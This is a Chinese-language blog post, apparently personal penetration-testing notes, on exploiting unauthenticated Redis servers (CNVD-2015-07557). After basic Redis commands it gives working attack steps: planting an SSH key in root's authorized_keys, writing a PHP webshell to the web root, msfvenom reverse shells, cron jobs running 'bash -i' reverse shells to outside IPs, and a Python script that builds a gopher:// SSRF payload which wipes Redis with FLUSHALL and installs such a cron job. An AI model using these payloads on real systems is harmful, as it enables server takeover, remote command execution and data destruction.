<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
    Redis
  </title>
  <meta name="description" content="1">
  <meta name="keywords" content="">
  <meta name="author" content="RecoveryAshes">
  <link rel="canonical" href="https://blog.finalline.net/2024/07/06/Redis/">
  
  
  <link rel="icon" type="image/svg" href='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 10l7.383 7.418c.823.82.823 2.148 0 2.967a2.11 2.11 0 0 1-2.976 0L10 13"></path><path d="M6.293 15.293l-2.586-2.586a1 1 0 0 1 0-1.414l7.586-7.586a1 1 0 0 1 1.414 0l2.586 2.586a1 1 0 0 1 0 1.414l-7.586 7.586a1 1 0 0 1-1.414 0z"></path></g></svg>'>
  
  
  
<link rel="stylesheet" href="../../../../css/b4c95347.css">

  <script>window.i18n = {"tip-status-done":"完成","tip-status-default":"全部","tip-status-todo":"计划","tip-status-doing":"进行","tip-status-other":"其他","text-select":"选择","text-move":"移动","text-esc":"退出","January":"一月","February":"二月","March":"三月","April":"四月","May":"五月","June":"六月","July":"七月","August":"八月","September":"九月","October":"十月","November":"十一月","December":"十二月"}</script>
<meta name="generator" content="Hexo 7.3.0"></head>

<body id="app">
  <aside id="aside-box" class="left-aside">
    <div class="header">
      
<link rel="stylesheet" href="../../../../css/61875ce9.css">

<div class="profile">
  <a class="badge" href="/">
    <span>Hi</span>
    <span>RecoveryAshes</span>
  </a>
  <cosy-tooltip id="left-aside-button" placement="right">
    <span slot="content">
      <span>显示 / 隐藏 左侧导航</span>
      <cosy-short-key>[</cosy-short-key>
    </span>
    <cosy-icon>
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
        <g fill="none">
          <path d="M16 4c1.104-.019 2 .896 2 2v8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h12zm1 2a1 1 0 0 0-1-1h-2.995v10H16a1 1 0 0 0 1-1V6zm-4.995 9V5H4.001a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8.004z" fill="currentColor"></path>
        </g>
      </svg>
    </cosy-icon>
  </cosy-tooltip>
</div>

<script src="../../../../js/69622cae.js"></script>

      


<cosy-search id="post-search" placeholder="搜索">
  <div slot="short-key">
    <cosy-short-key>⌘</cosy-short-key>
    <cosy-short-key>K</cosy-short-key>
  </div>
</cosy-search>


<script>
  window.algolia = {
    appId: "GVT6OJD87S",
    SearchOnlyAPIKey: "02cf9010404e6be4331ee18a1d3524ea"
  }
</script>


<script src="../../../../js/0a6f193b.js"></script>

    </div>
    <div class="aside-category">
      
<link rel="stylesheet" href="../../../../css/db04a759.css">


<nav class="category-nav cosy-scrollbar">
  <ul><li data-path="archives">
        <a href="/archives">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M3.5 3A1.5 1.5 0 0 0 2 4.5v4A1.5 1.5 0 0 0 3.5 10h9A1.5 1.5 0 0 0 14 8.5v-4A1.5 1.5 0 0 0 12.5 3h-9zM3 4.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v4a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-4zm.5 6.5A1.5 1.5 0 0 0 2 12.5v4A1.5 1.5 0 0 0 3.5 18h9a1.5 1.5 0 0 0 1.5-1.5v-4a1.5 1.5 0 0 0-1.5-1.5h-9zM3 12.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v4a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-4zm14-.063a2.003 2.003 0 0 1-2.5-1.937A2 2 0 0 1 16 8.563a2.005 2.005 0 0 1 1 0a2 2 0 0 1 0 3.874zM16.5 3a.5.5 0 0 1 .5.5v4.041a3.02 3.02 0 0 0-1 0V3.5a.5.5 0 0 1 .5-.5zm0 10.5c-.17 0-.337-.014-.5-.041V17.5a.5.5 0 0 0 1 0v-4.041c-.163.027-.33.041-.5.041z" fill="currentColor"></path></g></svg>
          <div class="ellipsis">归档</div>
        </a>
      </li><li data-path="cosy-roadmap">
        <a href="/cosy-roadmap">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M9.384 2a1 1 0 0 0-.966.742L4.616 17H2.5a.5.5 0 0 0 0 1h15a.5.5 0 0 0 0-1h-2.116L11.582 2.742A1 1 0 0 0 10.616 2H9.384zM5.651 17l.8-3H11.5a.5.5 0 0 0 0-1H6.717l.534-2H10.5a.5.5 0 0 0 0-1H7.517l1.867-7h1.232l3.733 14H5.651z" fill="currentColor"></path></g></svg>
          <div class="ellipsis">路线图</div>
        </a>
      </li><li data-path="cosy-resume">
        <a href="/cosy-resume">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M8.5 4.498a1.5 1.5 0 1 1 3 0a1.5 1.5 0 0 1-3 0zm1.5-2.5a2.5 2.5 0 0 0-2.43 3.086L5.471 4.15a1.761 1.761 0 0 0-2.317.88c-.4.882-.008 1.917.877 2.31L7 8.662v2.287l-1.877 4.645a1.75 1.75 0 0 0 3.245 1.311l1.556-3.849a.073.073 0 0 1 .028-.038a.086.086 0 0 1 .046-.012c.02 0 .035.005.046.012a.074.074 0 0 1 .028.038l1.555 3.849a1.75 1.75 0 0 0 3.245-1.311L13 10.96V8.662l2.968-1.322a1.74 1.74 0 0 0 .877-2.31a1.761 1.761 0 0 0-2.317-.88l-2.097.934a2.5 2.5 0 0 0-2.43-3.086zM4.065 5.444a.761.761 0 0 1 1-.38l3.918 1.744a2.5 2.5 0 0 0 2.034 0l3.918-1.744a.761.761 0 0 1 1 .38a.739.739 0 0 1-.373.983l-2.969 1.321a1 1 0 0 0-.593.914v2.298a1 1 0 0 0 .073.375l1.872 4.633a.75.75 0 0 1-1.39.562l-1.556-3.849c-.364-.9-1.639-.9-2.003 0l-1.555 3.85a.75.75 0 1 1-1.39-.562l1.876-4.646A1 1 0 0 0 8 10.95V8.662a1 1 0 0 0-.593-.914L4.438 6.427a.739.739 0 0 1-.373-.983z" fill="currentColor"></path></g></svg>
          <div class="ellipsis">简历</div>
        </a>
      </li></ul>
  <ul><li class="active">
        <a href="../../../../categories/%E6%9D%82/">
          
          <div class="ellipsis">
            <span>杂</span>
          </div>
        </a>
      </li></ul>
</nav>


<script src="../../../../js/066f8989.js"></script>

    </div>
    <div class="bottom">
      <cosy-tooltip id="button-preference" placement="right">
        <span slot="content">
          <span>偏好</span>
          <cosy-short-key>⌘</cosy-short-key>
          <cosy-short-key>p</cosy-short-key>
        </span>
        <cosy-icon bordered id="button-about-cosy-theme">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 16 16">
            <g fill="none">
              <path d="M8 6a2 2 0 1 0 0 4a2 2 0 0 0 0-4zM7 8a1 1 0 1 1 2 0a1 1 0 0 1-2 0zm3.618-3.602a.708.708 0 0 1-.824-.567l-.26-1.416a.354.354 0 0 0-.275-.282a6.072 6.072 0 0 0-2.519 0a.354.354 0 0 0-.275.282l-.259 1.416a.71.71 0 0 1-.936.538l-1.359-.484a.355.355 0 0 0-.382.095c-.569.627-1 1.367-1.262 2.173a.352.352 0 0 0 .108.378l1.102.931a.704.704 0 0 1 0 1.076l-1.102.931a.352.352 0 0 0-.108.378A5.986 5.986 0 0 0 3.53 12.02a.355.355 0 0 0 .382.095l1.36-.484a.708.708 0 0 1 .936.538l.258 1.416c.026.14.135.252.275.281a6.075 6.075 0 0 0 2.52 0a.353.353 0 0 0 .274-.281l.26-1.416a.71.71 0 0 1 .936-.538l1.359.484c.135.048.286.01.382-.095c.569-.627 1-1.367 1.262-2.173a.352.352 0 0 0-.108-.378l-1.102-.931a.703.703 0 0 1 0-1.076l1.102-.931a.352.352 0 0 0 .108-.378A5.985 5.985 0 0 0 12.47 3.98a.355.355 0 0 0-.382-.095l-1.36.484a.71.71 0 0 1-.111.03zm-6.62.58l.937.333a1.71 1.71 0 0 0 2.255-1.3l.177-.97a5.105 5.105 0 0 1 1.265 0l.178.97a1.708 1.708 0 0 0 2.255 1.3L12 4.977c.255.334.467.698.63 1.084l-.754.637a1.704 1.704 0 0 0 0 2.604l.755.637a4.99 4.99 0 0 1-.63 1.084l-.937-.334a1.71 1.71 0 0 0-2.255 1.3l-.178.97a5.099 5.099 0 0 1-1.265 0l-.177-.97a1.708 1.708 0 0 0-2.255-1.3L4 11.023a4.987 4.987 0 0 1-.63-1.084l.754-.638a1.704 1.704 0 0 0 0-2.603l-.755-.637c.164-.386.376-.75.63-1.084z" fill="currentColor"></path>
            </g>
          </svg>
        </cosy-icon>
      </cosy-tooltip>
    </div>
  </aside>
  <main>
    
<link rel="stylesheet" href="../../../../css/4dbc8f91.css">


<div class="post-container">
  <header>
    <div class="left">
      
<link rel="stylesheet" href="../../../../css/7d333f9e.css">

<nav class="breadcrumb">
  <section>
    <cosy-tooltip placement="bottom-left">
      <span slot="content"><span>首页</span>
        <cosy-short-key>⌘</cosy-short-key>
        <cosy-short-key>H</cosy-short-key>
      </span>
      <cosy-icon href="/">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
          <g fill="none">
            <path d="M8.998 2.388a1.5 1.5 0 0 1 2.005 0l5.5 4.942A1.5 1.5 0 0 1 17 8.445V15.5a1.5 1.5 0 0 1-1.5 1.5H13a1.5 1.5 0 0 1-1.5-1.5V12a.5.5 0 0 0-.5-.5H9a.5.5 0 0 0-.5.5v3.5A1.5 1.5 0 0 1 7 17H4.5A1.5 1.5 0 0 1 3 15.5V8.445c0-.425.18-.83.498-1.115l5.5-4.942zm1.336.744a.5.5 0 0 0-.668 0l-5.5 4.942A.5.5 0 0 0 4 8.445V15.5a.5.5 0 0 0 .5.5H7a.5.5 0 0 0 .5-.5V12A1.5 1.5 0 0 1 9 10.5h2a1.5 1.5 0 0 1 1.5 1.5v3.5a.5.5 0 0 0 .5.5h2.5a.5.5 0 0 0 .5-.5V8.445a.5.5 0 0 0-.166-.371l-5.5-4.942z" fill="currentColor"></path>
          </g>
        </svg>
      </cosy-icon>
    </cosy-tooltip>
    
    
    <svg class="arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
      <g fill="none">
        <path d="M7.733 4.207a.75.75 0 0 1 1.06.026l5.001 5.25a.75.75 0 0 1 0 1.035l-5 5.25a.75.75 0 1 1-1.087-1.034L12.216 10l-4.51-4.734a.75.75 0 0 1 .027-1.06z" fill="currentColor"></path>
      </g>
    </svg>
    <a class="ellipsis" href="../../../../categories/%E6%9D%82/">
      杂
    </a>
    
    
    
    <svg class="arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
      <g fill="none">
        <path d="M7.733 4.207a.75.75 0 0 1 1.06.026l5.001 5.25a.75.75 0 0 1 0 1.035l-5 5.25a.75.75 0 1 1-1.087-1.034L12.216 10l-4.51-4.734a.75.75 0 0 1 .027-1.06z" fill="currentColor"></path>
      </g>
    </svg>
    <span class="ellipsis">
      Redis
    </span>
    
  </section>
</nav>


<script src="../../../../js/31d6cfe0.js"></script>

    </div>
    <div class="right">
      
        <cosy-tooltip id="toc-show-button" placement="left">
          <span slot="content">
            <span>显示 / 隐藏 文章目录</span>
            <cosy-short-key>]</cosy-short-key>
          </span>
          <cosy-icon>
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
              <g fill="none">
                <path
                  d="M4 4c-1.104-.019-2 .896-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2H4zM3 6a1 1 0 0 1 1-1h2.995v10H4a1 1 0 0 1-1-1V6zm4.995 9V5h8.004a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1H7.995z"
                  fill="currentColor"></path>
              </g>
            </svg>
          </cosy-icon>
        </cosy-tooltip>
        
    </div>
  </header>
  <div class="content">
    <main class="cosy-scrollbar">
      <div class="article-container">
        <!-- 渲染文章内容 -->
        <article>
          <!-- 文章标题 -->
          <h1 class="post-title">Redis</h1>
          <div class="last-updated">
            上次更新: 2024-07-06 20:30:50
          </div>
          <!-- 文章 -->
          <h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><h2 id="1-什么是-redis"><a href="#1-什么是-redis" class="headerlink" title="1.什么是 redis"></a>1.什么是 redis</h2><p><a target="_blank" rel="noopener" href="https://redis.io/">Redis</a>（Remote Dictionary Server）是一个开源的，高性能的，支持网络、可基于内存也可以持久化的键值对（key-value）存储系统。它可以用作数据库、缓存和消息中间件。Redis支持多种类型的数据结构，如字符串（strings）、列表（lists）、集合（sets）、有序集合（sorted sets）、哈希表（hashes）、位图（bitmaps）、超日志（hyperloglogs）和地理空间（geospatial）索引半径查询。</p>
<h2 id="2-默认端口"><a href="#2-默认端口" class="headerlink" title="2.默认端口"></a>2.默认端口</h2><p><strong>6379</strong></p>
<h2 id="3-常用命令"><a href="#3-常用命令" class="headerlink" title="3.常用命令"></a>3.常用命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">101.133</span>.235.21 <span class="token parameter variable">-p</span> <span class="token number">6379</span> <span class="token comment">#连接</span>

INFO <span class="token comment">#获取Redis服务器的信息和统计信息。服务器状态、内存使用情况、客户端连接信息等。</span>

ONFIG GET parameter <span class="token comment">#获取配置参数的值。例如，CONFIG GET dir会返回Redis的当前工作目录。</span>

CONFIG SET parameter value <span class="token comment">#设置配置参数的值。例如，CONFIG SET dir /new/path会设置Redis的工作目录为/new/path。</span>

CONFIG GET dbfilename <span class="token comment">#获取当前使用的RDB文件名。</span>

CONFIG SET dbfilename filename <span class="token comment">#设置RDB文件的名称。</span>

SAVE <span class="token comment">#同步保存数据到磁盘上，这个命令会阻塞所有客户端，直到RDB文件被写入磁盘。</span>

FLUSHALL <span class="token comment">#删除所有数据库中的所有键，清空Redis中所有的数据.</span>

FLUSHDB <span class="token comment"># 删除当前数据库中的所有键，清空当前选中的数据库中的数据。</span>

KEYS pattern <span class="token comment">#查找所有符合给定模式pattern的键。KEYS * 列出当前数据库中的所有键,数据量很大时可能会导致服务器阻塞</span>

SELECT num <span class="token comment">#切换到指定的数据库，Redis默认有16个数据库，编号0到15。</span>

SET key value <span class="token comment">#设置键的值。SET aaa "mi1k7ea"会创建一个键为aaa，值为mi1k7ea的键值对。</span>

GET key <span class="token comment">#获取键的值。GET aaa会返回键aaa的值。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="4-未授权访问"><a href="#4-未授权访问" class="headerlink" title="4.未授权访问"></a>4.未授权访问</h2><p>由于配置不当的原因，导致 Redis 服务暴露在公网，并且没有开启相关认证和添加相关安全策略的情况下，未正在受保护的模式下运行，即存在未授权访问漏洞。</p>
<h3 id="1-CNVD-2015-07557"><a href="#1-CNVD-2015-07557" class="headerlink" title="1.CNVD-2015-07557"></a>1.CNVD-2015-07557</h3><h4 id="1-影响版本"><a href="#1-影响版本" class="headerlink" title="1.影响版本"></a>1.影响版本</h4><p>Redis &lt;&#x3D; 5.0.5</p>
<h4 id="2-漏洞探测"><a href="#2-漏洞探测" class="headerlink" title="2.漏洞探测"></a>2.漏洞探测</h4><p>使用 nmap 探测到目标主机使用了 Redis 服务对外开放且没有开启相关认证</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap  <span class="token parameter variable">-sV</span> <span class="token number">138.197</span>.230.162  <span class="token parameter variable">-sC</span>
redis-cli <span class="token parameter variable">-h</span> <span class="token number">101.133</span>.235.21 <span class="token parameter variable">-p</span> <span class="token number">6379</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h4><h5 id="1-ssh-key-公钥"><a href="#1-ssh-key-公钥" class="headerlink" title="1.ssh-key 公钥"></a>1.ssh-key 公钥</h5><p>前提是 Redis 服务是以 <strong>root 权限</strong>运行。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#生成公私钥，获取公钥内容</span>
ssh-keygen <span class="token parameter variable">-t</span> rsa

<span class="token function">cat</span> .ssh/id_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过 Redis 客户端将公钥内容写入到&#x2F;root&#x2F;.ssh&#x2F;authorized_keys 文件中<br>保存 key 的时候加上两个\n 避免和 Redis 里其他缓存数据混合：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh/

config <span class="token builtin class-name">set</span> dbfilename authorized_keys

<span class="token builtin class-name">set</span> payload <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC71hS18JNrnmajPt9x2fV2J28c1qVOTBjX8rfJy5OZJ+JseePq2kBCiAfy+mWFWxB9BPtu9OwQVMC9DsH/pwkr05aL9SUR3e3OIZqii0JA2ljLst9ckTlXxGlQUfUE5gwMRP8fHvNA6qJVjLkiJBY7BdBubRPkQ9jUWRhqoOnE3T4Tbzha9GuBON8ridJwTFiKdid4roGIM7joHdsIOdX/NS+Q8q8mFp9qXUeQmFGsvN0/rQAkwO6St7LTGX8gt766lLvoz9exPNLFPop5KFZkjmtPULiF1Z23Idk0OjtWqOYYI6pcoUZ4hlefnWYwhEJ2QUXbJu5MFe06Rf+gYatxEGmQiKExcrifpisuY1yK7Yy5C3pmejOcaqOj77O52c6TCw6zTBtLpLD5ev/LgwmhieDmrkp08q8OnvV87VfyIorGpHysDQgsiYo6XUAQVd5mTOkP9MIK8Sdg2ifLwXhq4nFRw75y7Bt6sMtvj2+aDKUVZAUtOgDMX/x60o+3pMk= htb-ac-1133154@htb-w1kmm40zlz<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>

save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用私钥直接 SSH 远程</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa root@101.133.235.21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="2-Web-目录写入-WebShell"><a href="#2-Web-目录写入-WebShell" class="headerlink" title="2.Web 目录写入 WebShell"></a>2.Web 目录写入 WebShell</h5><p><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells">Web Shell</a><br>Web 服务器的默认 Web 根目录</p>
<table>
<thead>
<tr>
<th>Web Server</th>
<th>Default Webroot</th>
</tr>
</thead>
<tbody><tr>
<td>Apache</td>
<td>&#x2F;var&#x2F;www&#x2F;html</td>
</tr>
<tr>
<td>Nginx</td>
<td>&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html&#x2F;</td>
</tr>
<tr>
<td>IIS</td>
<td>c:\inetpub\wwwroot\</td>
</tr>
<tr>
<td>XAMPP</td>
<td>C:\xampp\htdocs\</td>
</tr>
</tbody></table>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> payload <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&lt;?php system(<span class="token variable">$_REQUEST</span>['cmd']); ?><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>
config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html/  <span class="token comment">#可访问web目录</span>
config <span class="token builtin class-name">set</span> dbfilename shell.php
save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-d</span> <span class="token string">"cmd=whoami"</span> <span class="token parameter variable">--output</span> - http://101.133.235.21/shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="3-反弹-shell"><a href="#3-反弹-shell" class="headerlink" title="3.反弹 shell"></a>3.反弹 shell</h5><p><a target="_blank" rel="noopener" href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools">reverse-shell 备忘录</a><br><a target="_blank" rel="noopener" href="https://github.com/brightio/penelope">升级 TTYlinux</a><br><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/ConPtyShell/tree/master">升级 TTYwindows</a><br><a target="_blank" rel="noopener" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">手动升级 TTY</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
or
/usr/bin/script <span class="token parameter variable">-qc</span> /bin/bash /dev/null


ctrl+z
stty raw -echo<span class="token punctuation">;</span> <span class="token function">fg</span><span class="token punctuation">;</span> reset
<span class="token comment">#回车</span>
<span class="token comment">#回车</span>
<span class="token comment">#回车</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>生成自定义反向 Shell 脚本<br><a target="_blank" rel="noopener" href="https://burmat.gitbook.io/security/hacking/msfvenom-cheetsheet">msfvenom</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> php/reverse_php <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>OUR_IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>OUR_PORT <span class="token parameter variable">-f</span> raw <span class="token operator">></span> reverse.php
<span class="token punctuation">..</span>.SNIP<span class="token punctuation">..</span>.
Payload size: <span class="token number">3033</span> bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h6 id="1-手动写入计划任务"><a href="#1-手动写入计划任务" class="headerlink" title="1.手动写入计划任务"></a>1.手动写入计划任务</h6><p>不同系统任务调度文件</p>
<table>
<thead>
<tr>
<th>OS</th>
<th>PATH</th>
</tr>
</thead>
<tbody><tr>
<td>Ubuntu</td>
<td>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;xxx</td>
</tr>
<tr>
<td>Debian</td>
<td>&#x2F;etc&#x2F;cron.d&#x2F;xxx</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;xxx</td>
<td></td>
</tr>
<tr>
<td>Alpine</td>
<td>&#x2F;etc&#x2F;cron.d&#x2F;xxx</td>
</tr>
</tbody></table>
<p>直接用进入 redis 写入计划任务(<strong>debian 失败，写入乱码</strong>)</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/crontabs/
config <span class="token builtin class-name">set</span> dbfilename root

<span class="token builtin class-name">set</span> payload <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * bash -i >&amp; /dev/tcp/192.168.10.307/9443>&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>

save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h6 id="2-脚本写入定时任务-key-webshel等等都可以写"><a href="#2-脚本写入定时任务-key-webshel等等都可以写" class="headerlink" title="2.脚本写入定时任务(key,webshel等等都可以写)"></a>2.脚本写入定时任务(key,webshel等等都可以写)</h6><p>Python 2.7.18<br><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">Gopher 协议</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib
protocol<span class="token operator">=</span><span class="token string">"gopher://"</span>
ip<span class="token operator">=</span><span class="token string">'101.133.235.21'</span>
port<span class="token operator">=</span><span class="token string">'6379'</span>
reverse_ip<span class="token operator">=</span><span class="token string">"209.151.154.78"</span>
reverse_port<span class="token operator">=</span><span class="token string">"9443"</span>
cron<span class="token operator">=</span><span class="token string">"\n\n\n\n*/1 * * * * bash -i >&amp; /dev/tcp/%s/%s 0>&amp;1\n\n\n\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>reverse_ip<span class="token punctuation">,</span>reverse_port<span class="token punctuation">)</span>
filename<span class="token operator">=</span><span class="token string">"root"</span>
path<span class="token operator">=</span><span class="token string">"/var/spool/cron/crontabs"</span>
passwd<span class="token operator">=</span><span class="token string">""</span>
cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
     <span class="token string">"set 1 &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>cron<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"config set dir &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"config set dbfilename &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"save"</span>
     <span class="token punctuation">]</span>
<span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span>
<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>
    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd<span class="token operator">=</span><span class="token string">""</span>
    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
        <span class="token comment">#计算命令的长度，并用字符串表示。这里使用了$&#123;IFS&#125;环境变量来代替实际的空格，以确保命令中的空格</span>
        <span class="token comment">#不会被误认为是分隔符。</span>
        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd<span class="token operator">+=</span>CRLF
    <span class="token keyword">return</span> cmd

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2 redis.py

